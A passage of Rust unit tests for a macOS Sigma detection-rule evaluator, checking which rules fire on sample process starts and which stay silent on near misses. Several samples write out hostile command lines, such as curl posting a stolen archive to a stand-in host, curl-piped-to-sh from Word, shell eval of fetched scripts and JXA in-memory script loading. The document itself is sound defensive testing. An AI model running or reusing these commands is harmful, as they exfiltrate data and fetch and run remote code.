            Some("Igor Fits, Mikhail Larin, oscd.community")
        );
        assert_eq!(
            m.file,
            "rules/macos/process_creation/proc_creation_macos_binary_padding.yml"
        );
    }

    /// Every rule that can raise a finding, high or critical and evaluated, has one start it
    /// must fire on and one near miss it must stay silent on, written from what the rule
    /// describes. A new such rule without samples fails here.
    #[test]
    fn every_high_rule_fires_on_its_sample_and_not_on_its_near_miss() {
        let rules = Rules::shipped();
        let samples: Vec<(&str, ProcessStart, ProcessStart)> = vec![
            (
                // Amos: curl posting the archive it collected, with its build headers.
                "e710a880-1f18-4417-b6a0-b5afdf7e33da",
                start(
                    "/usr/bin/curl",
                    &[
                        "curl",
                        "-X",
                        "POST",
                        "-H",
                        "user: 7f3a",
                        "-H",
                        "BuildID: c0ffee",
                        "-H",
                        "cl: 0",
                        "--max-time",
                        "300",
                        "-F",
                        "file=@/tmp/out.zip",
                        "http://192.0.2.10/contact",
                    ],
                    "/bin/sh",
                ),
                // An ordinary upload of a zip with curl.
                start(
                    "/usr/bin/curl",
                    &[
                        "curl",
                        "-X",
                        "POST",
                        "-F",
                        "file=@/tmp/report.zip",
                        "https://example.invalid/upload",
                    ],
                    "/bin/zsh",
                ),
            ),
            (
                // Axios npm compromise: the dropper starts its AppleScript in the background.
                "a09ee860-31b3-4586-8a68-0ebd74ce0e5f",
                start(
                    "/bin/sh",
                    &[
                        "sh",
                        "-c",
                        "nohup osascript /tmp/6202033 > /dev/null 2>&1 &",
                    ],
                    "/usr/local/bin/node",
                ),
                // Cleaning a build folder.
                start("/bin/rm", &["rm", "-rf", "/tmp/build-cache"], "/bin/zsh"),
            ),
            (
                BINARY_PADDING,
                start(
                    "/bin/dd",
                    &["dd", "if=/dev/urandom", "bs=1", "count=1"],
                    "/bin/sh",
                ),
                start(
                    "/bin/dd",
                    &["dd", "if=disk.img", "of=/dev/rdisk9", "bs=1m"],
                    "/bin/zsh",
                ),
            ),
            (
                // Searching files for passwords with grep.
                "53b1b378-9b06-4992-b972-dde6e423d2b4",
                start(
                    "/usr/bin/grep",
                    &["grep", "-ri", "password", "/tmp/notes"],
                    "/bin/zsh",
                ),
                start("/usr/bin/grep", &["grep", "-r", "TODO", "src"], "/bin/zsh"),
            ),
            (
                // A Word macro starting a shell.
                "69483748-1525-4a6c-95ca-90dc8d431b68",
                start(
                    "/bin/sh",
                    &["sh", "-c", "curl -s http://192.0.2.10/a | sh"],
                    "/Applications/Microsoft Word.app/Contents/MacOS/Microsoft Word",
                ),
                // A shell starting a shell in a terminal.
                start("/bin/sh", &["sh", "-c", "ls"], "/bin/zsh"),
            ),
            (
                // JXA fetching and evaluating a script in memory.
                "f1408a58-0e94-4165-b80a-da9f96cf6fc3",
                start(
                    "/usr/bin/osascript",
                    &[
                        "osascript",
                        "-l",
                        "JavaScript",
                        "-e",
                        "eval(ObjC.unwrap($.NSString.alloc.initWithDataEncoding($.NSData.dataWithContentsOfURL($.NSURL.URLWithString('http://192.0.2.10/p')),$.NSUTF8StringEncoding)))",
                    ],
                    "/bin/zsh",
                ),
                // JXA asking Finder for its name.
                start(
                    "/usr/bin/osascript",
                    &[
                        "osascript",
                        "-l",
                        "JavaScript",
                        "-e",
                        "Application('Finder').name()",
                    ],
                    "/bin/zsh",
                ),
            ),
            (
                // PlistBuddy making a launch agent run at load.
                "65d506d3-fcfe-4071-b4b2-bcefe721bbbb",
                start(
                    "/usr/libexec/PlistBuddy",
                    &[
                        "PlistBuddy",
                        "-c",
                        "Add :RunAtLoad bool true",
                        "/tmp/home/Library/LaunchAgents/com.example.agent.plist",
                    ],
                    "/bin/sh",
                ),
                // Turning it off again.
                start(
                    "/usr/libexec/PlistBuddy",
                    &[
                        "PlistBuddy",
                        "-c",
                        "Set :RunAtLoad false",
                        "/tmp/home/Library/LaunchAgents/com.example.agent.plist",
                    ],
                    "/bin/sh",
                ),
            ),
            (
                // A run-only script compiled from a one-liner.
                "b9d9b652-d8ed-4697-89a2-a1186ee680ac",
                start(
                    "/usr/bin/osacompile",
                    &[
                        "osacompile",
                        "-x",
                        "-e",
                        "do shell script \"id\"",
                        "-o",
                        "/tmp/a.scpt",
                    ],
                    "/bin/sh",
                ),
                // An ordinary compile that keeps the source.
                start(
                    "/usr/bin/osacompile",
                    &["osacompile", "-o", "/tmp/a.scpt", "/tmp/a.applescript"],
                    "/bin/zsh",
                ),
            ),
            (
                // MeshAgent renamed, still given its service name.
                RENAMED_MESHAGENT,
                start(
                    "/tmp/.helper",
                    &["/tmp/.helper", "--meshServiceName", "Support"],
                    "/bin/sh",
                ),
                // MeshAgent under its own name.
                start(
                    "/opt/mesh/meshagent",
                    &["/opt/mesh/meshagent", "--meshServiceName", "Support"],
                    "/sbin/launchd",
                ),
            ),
            (
                // A bash one-liner cutting base64 out of an image and decoding it.
                "09a910bf-f71f-4737-9c40-88880ba5913d",
                start(
                    "/bin/bash",
                    &[
                        "/bin/bash",
                        "-c",
                        "tail -c +21453 '/Volumes/Installer/logo.jpeg' | base64 --decode > /tmp/x.zip",
                    ],
                    "/bin/sh",
                ),
                // The same from a text file.
                start(
                    "/bin/bash",
                    &[
                        "/bin/bash",
                        "-c",
                        "tail -c +100 notes.txt | base64 --decode > /tmp/x.bin",
                    ],
                    "/bin/sh",
                ),
            ),
            (
                // WizardUpdate: sh evaluating what curl fetched.
                "f68c4a4f-19ef-4817-952c-50dce331f4b0",
                start(
                    "/bin/sh",
                    &[
                        "sh",
                        "-c",
                        "s=$(curl -fsL http://192.0.2.10/i); eval \"$s\"",
                    ],
                    "/bin/bash",
                ),
                // sh keeping what curl fetched without running it.
                start(
                    "/bin/sh",
                    &[
                        "sh",
                        "-c",
                        "v=$(curl -fsL https://example.invalid/version); echo $v",
                    ],
                    "/bin/bash",
                ),
            ),
        ];
        let high: BTreeSet<&str> = rules
            .rules
            .iter()
            .filter(|l| !matches!(l.placement, Placement::NotEvaluated(_)))
            .filter_map(|l| l.meta.as_ref())
            .filter(|m| m.level >= Level::High)
            .map(|m| m.id.as_str())
            .collect();
        let sampled: BTreeSet<&str> = samples.iter().map(|(id, _, _)| *id).collect();
        assert_eq!(
            high, sampled,
            "every high rule that is evaluated has samples"
        );
        for (id, hit, miss) in &samples {
            assert!(fires(rules, id, hit), "{id} fires on its sample");
            assert!(
                !fires(rules, id, miss),
                "{id} stays silent on its near miss"
            );
        }
    }

    /// A start whose message names no program before the `exec` gives no `ParentImage`: the
    /// field is absent, not empty, so a rule asking for an empty parent does not take it for
    /// one.
    #[test]
    fn a_parent_the_start_does_not_give_is_absent_not_empty() {
        let rules = Rules::load(&[(
            "empty-parent.yml",
            invented("    selection:\n        ParentImage: ''\n    condition: selection\n"),
        )]);
        let mut s = start("/bin/x", &["x"], "");
        assert_eq!(rules.evaluate(&s).len(), 1);
        s.parent_executable = None;
        assert!(rules.evaluate(&s).is_empty());
    }

    /// How sure a finding from a published rule is follows the rule's status: a high match of
    /// a rule SigmaHQ calls stable is urgent, one of a rule still in test or experimental is
    /// not, and no published rule is ever sure, since none was tuned to this Mac.
    #[test]
    fn only_a_stable_rule_s_high_match_is_urgent_and_none_is_sure() {
        for (status, urgent) in [
            (Status::Stable, true),
            (Status::Test, false),
            (Status::Experimental, false),
        ] {
            let sure = Some(status.confidence());
            assert_eq!(crate::findings::urgent("high", sure), urgent, "{status:?}");
        }
        assert!(STATUSES.iter().all(|(_, s)| s.confidence() != "high"));
    }

    /// The command line is the arguments joined by single spaces, the first included, so a
    /// rule that reads two arguments as one string, "-s +", sees them; the same written as one
    /// argument is another command line, and the rule does not see it.
    #[test]
    fn the_command_line_is_the_arguments_joined_by_spaces() {
        let s = start(
            "/usr/bin/truncate",
            &["truncate", "-s", "+1", "f"],
            "/bin/sh",
        );
        let (_, command_line) = FIELDS.iter().find(|(n, _)| *n == "CommandLine").unwrap();
        assert_eq!(command_line(&s).as_deref(), Some("truncate -s +1 f"));
        let rules = Rules::shipped();
        assert!(fires(rules, BINARY_PADDING, &s));
        let glued = start("/usr/bin/truncate", &["truncate", "-s+1", "f"], "/bin/sh");
        assert!(!fires(rules, BINARY_PADDING, &glued));
    }

    /// Sigma's values are case-insensitive, and macOS's default file system is too, so
    /// `/BIN/DD` runs `dd`: the evaluator folds case for `endswith`, `contains` and plain
    /// equality alike.
    #[test]
    fn values_match_whatever_their_case() {
        let rules = Rules::shipped();
        let shouted = start("/BIN/DD", &["DD", "IF=/DEV/ZERO"], "/bin/sh");
        assert!(fires(rules, BINARY_PADDING, &shouted));
        let find = start("/USR/BIN/FIND", &["find", "."], "/bin/zsh");
        assert!(fires(rules, FILE_DISCOVERY, &find));
        // `endswith: '/dd'` holds the slash: another program whose name ends in dd is not dd.
        let gdd = start("/usr/local/bin/gdd", &["gdd", "if=/dev/zero"], "/bin/sh");
        assert!(!fires(rules, BINARY_PADDING, &gdd));
    }

    /// Regular expressions are case-sensitive, as the specification says, unlike every other
    /// value: the scanning rule leaves `nc -l`, a listener, to its filter, and `nc -L` is not
    /// one.
    #[test]
    fn regular_expressions_keep_case() {
        let rules = Rules::shipped();
        let listen = start("/usr/bin/nc", &["nc", "-l", "8080"], "/bin/zsh");
        assert!(!fires(rules, NETWORK_SCANNING, &listen));
        let upper = start("/usr/bin/nc", &["nc", "-L", "8080"], "/bin/zsh");
        assert!(fires(rules, NETWORK_SCANNING, &upper));
    }

    /// A regular expression is searched for anywhere in the value, not matched against the
    /// whole of it; the specification does not say which. So "Hidden User Creation", whose
    /// expression means a user id below 500, takes any digit in the command line, and fires
    /// on id 501. Pinned so that a change in the evaluator is seen.
    #[test]
    fn regular_expressions_are_searched_not_anchored() {
        let rules = Rules::shipped();
        let create = start(
            "/usr/bin/dscl",
            &["dscl", ".", "-create", "/Users/example", "UniqueID", "501"],
            "/bin/zsh",
        );
        assert!(fires(rules, HIDDEN_USER, &create));
    }

    /// A field a program start does not give is absent, and an absent field matches nothing.
    /// The renamed-MeshAgent rule is evaluated in part, its `OriginalFileName` alternative
    /// named as never matching here: a renamed MeshAgent started without its service name is
    /// not seen, and the summary says so.
    #[test]
    fn a_field_this_level_does_not_have_never_matches_and_is_named() {
        let rules = Rules::shipped();
        assert_eq!(
            by_id(rules, RENAMED_MESHAGENT).placement,
            Placement::InPart(vec![Branch {
                selection: "selection_meshagent".into(),
                fields: vec!["OriginalFileName".into()],
            }])
        );
        let quiet = start("/tmp/.helper", &["/tmp/.helper", "-run"], "/bin/sh");
        assert!(!fires(rules, RENAMED_MESHAGENT, &quiet));
        let s = rules.summary_json();
        assert_eq!(
            s["in_part"][0]["never_matches"],
            json!([{ "selection_text": "selection_meshagent", "fields_text": ["OriginalFileName"] }])
        );
    }

    /// The browser-child rule leaves out starts without arguments with `CommandLine: ''` and
    /// `CommandLine: null`. Every start has a command line here, empty when there are no
    /// arguments, so `''` is what applies; `null` matches only a field present as null, which
    /// a start never has. A `*` inside a `contains` value is still a wildcard.
    #[test]
    fn an_empty_command_line_and_wildcards_inside_values() {
        let rules = Rules::shipped();
        let parent = "/Applications/Safari.app/Contents/MacOS/Safari";
        let shell = start("/bin/zsh", &["zsh", "-c", "id"], parent);
        assert!(fires(rules, BROWSER_CHILD, &shell));
        let bare = start("/bin/zsh", &[], parent);
        assert!(!fires(rules, BROWSER_CHILD, &bare));
        let update = start(
            "/bin/sh",
            &[
                "sh",
                "/Library/Application Support/Microsoft/MAU2.0/Microsoft AutoUpdate.app/Contents/MacOS/msupdate",
            ],
            parent,
        );
        assert!(!fires(rules, BROWSER_CHILD, &update));
    }

    /// File rules are about files written, and their `Image` is the writer, not a program
    /// started: they are not evaluated, with the reason, and never match a program start, even
    /// one whose fields would satisfy them.
    #[test]
    fn a_rule_for_file_events_is_not_evaluated_and_never_matches() {
        let rules = Rules::load(&[(
            "invented/file.yml",
            "title: Invented file rule\nid: 00000000-0000-4000-8000-000000000001\nstatus: test\n\
             level: high\nlogsource:\n    category: file_event\n    product: macos\n\
             detection:\n    selection:\n        Image|endswith: '/curl'\n    condition: selection\n",
        )]);
        assert_eq!(
            rules.rules[0].placement,
            Placement::NotEvaluated(Reason::NeedsEvents("file_event".into()))
        );
        let curl = start(
            "/usr/bin/curl",
            &["curl", "https://example.invalid"],
            "/bin/zsh",
        );
        assert!(rules.evaluate(&curl).is_empty());
        let shipped = Rules::shipped();
        let amos = by_id(shipped, "e710a880-1f18-4417-b6a0-b5afdf7e3023");
        assert_eq!(
            amos.placement,
            Placement::NotEvaluated(Reason::NeedsEvents("file_event".into()))
        );
        assert!(!fires(
            shipped,
            "e710a880-1f18-4417-b6a0-b5afdf7e3023",
            &curl
        ));
    }

    const HEAD: &str = "title: Invented\nid: 00000000-0000-4000-8000-000000000002\n";
    const TAIL: &str = "logsource:\n    category: process_creation\n    product: macos\n";
    const PLAIN: &str =
        "detection:\n    selection:\n        Image: '/x'\n    condition: selection\n";

    fn invented(detection: &str) -> &'static str {
        let text = format!("{HEAD}status: test\nlevel: medium\n{TAIL}detection:\n{detection}");
        Box::leak(text.into_boxed_str())
    }

    /// A selection that cannot match without a missing field makes the whole rule not
    /// evaluated, the field named; one alternative of several only makes it evaluated in part.
    /// A keyword search and a rule that cannot be read are named too.
    #[test]
    fn placement_names_what_a_rule_needs() {
        let needs = invented(
            "    selection:\n        Image|endswith: '/x'\n        User: root\n    condition: selection\n",
        );
        let part = invented(
            "    selection:\n        - Image|endswith: '/x'\n        - Hashes|contains: 'a'\n    condition: selection\n",
        );
        let keywords = invented("    keywords:\n        - 'evil'\n    condition: keywords\n");
        let broken =
            invented("    selection:\n        Image: '/x'\n    condition: selection and other\n");
        let rules = Rules::load(&[
            ("needs.yml", needs),
            ("part.yml", part),
            ("keywords.yml", keywords),
            ("broken.yml", broken),
        ]);
        assert_eq!(
            rules.rules[0].placement,
            Placement::NotEvaluated(Reason::NeedsFields(vec!["User".into()]))
        );
        assert_eq!(
            rules.rules[1].placement,
            Placement::InPart(vec![Branch {
                selection: "selection".into(),
                fields: vec!["Hashes".into()],
            }])
        );
        assert_eq!(
            rules.rules[2].placement,
            Placement::NotEvaluated(Reason::KeywordSearch)
        );
        let Placement::NotEvaluated(Reason::NotParsed(said)) = &rules.rules[3].placement else {
            panic!("a rule the evaluator cannot read is not parsed");
        };
        assert!(said.contains("other"), "{said}");
        assert!(rules.rules[3].meta.is_none());
        let x = start("/bin/x", &["x", "evil"], "/bin/zsh");
        let hit: Vec<&str> = rules.evaluate(&x).iter().map(|m| m.file).collect();
        assert_eq!(hit, ["part.yml"]);
        let s = rules.summary_json();
        assert_eq!(
            s["totals"],
            json!({ "shipped": 4, "evaluated": 0, "in_part": 1, "not_evaluated": 3 })
        );
    }

    /// A rule is evaluated only when it can be read and has an id, a level and a status of
    /// Sigma's, so that every match can be named and weighed; otherwise it is named as not
    /// parsed, with what was wrong.
    #[test]
    fn a_rule_that_cannot_be_read_is_named_with_why() {
        let leak = |s: String| -> &'static str { Box::leak(s.into_boxed_str()) };
        let rules = Rules::load(&[
            ("yaml.yml", "title: [unclosed\n"),
            (
                "id.yml",
                leak(format!(
                    "title: No id\nstatus: test\nlevel: low\n{TAIL}{PLAIN}"
                )),
            ),
            (
                "level.yml",
                leak(format!("{HEAD}status: test\n{TAIL}{PLAIN}")),
            ),
            (
                "status.yml",
                leak(format!("{HEAD}level: low\n{TAIL}{PLAIN}")),
            ),
            (
                "severe.yml",
                leak(format!("{HEAD}status: test\nlevel: severe\n{TAIL}{PLAIN}")),
            ),
        ]);
        let said: Vec<String> = rules
            .rules
            .iter()
            .map(|l| match &l.placement {
                Placement::NotEvaluated(Reason::NotParsed(said)) => said.clone(),
                other => panic!("{} is {other:?}", l.file),
            })
            .collect();
        assert!(said[0].contains("line 1"), "{}", said[0]);
        assert_eq!(said[1], "the rule has no id");
        assert_eq!(said[2], "the rule has no level");
        assert_eq!(said[3], "the rule has no status");
        assert!(said[4].contains("unknown variant `severe`"), "{}", said[4]);
        let x = start("/x", &["x"], "/bin/zsh");
        assert!(rules.evaluate(&x).is_empty());
    }

    /// The summary an agent reads has stable names, says what this level gives, and lists
    /// the most severe rules first.
    #[test]
    fn the_summary_has_stable_names() {
        let s = Rules::shipped().summary_json();
        assert_eq!(s["events"], "process_creation");
        assert_eq!(s["fields"], json!(["Image", "CommandLine", "ParentImage"]));
        assert_eq!(s["source"]["commit"], COMMIT);
        assert_eq!(s["source"]["licence"], "DRL-1.1");
        let evaluated = s["evaluated"].as_array().unwrap();
        assert_eq!(evaluated[0]["level"], "high");
        assert_eq!(evaluated[evaluated.len() - 1]["level"], "informational");
        let padding = evaluated
            .iter()
            .find(|r| r["id_text"] == BINARY_PADDING)
            .unwrap();
        assert_eq!(
            padding,
            &json!({
                "file": "rules/macos/process_creation/proc_creation_macos_binary_padding.yml",
                "id_text": BINARY_PADDING,
                "title_text": "Binary Padding - MacOS",
                "level": "high",
                "status": "test",
            })
        );
        let lines = Rules::shipped().summary_lines(None);
        assert!(lines[0].contains("75 shipped"));
        assert!(
            lines
                .iter()
                .any(|l| l.contains("selection_meshagent needs OriginalFileName"))
        );
        assert!(lines.iter().any(|l| l.contains("needs file_event events")));
    }
}
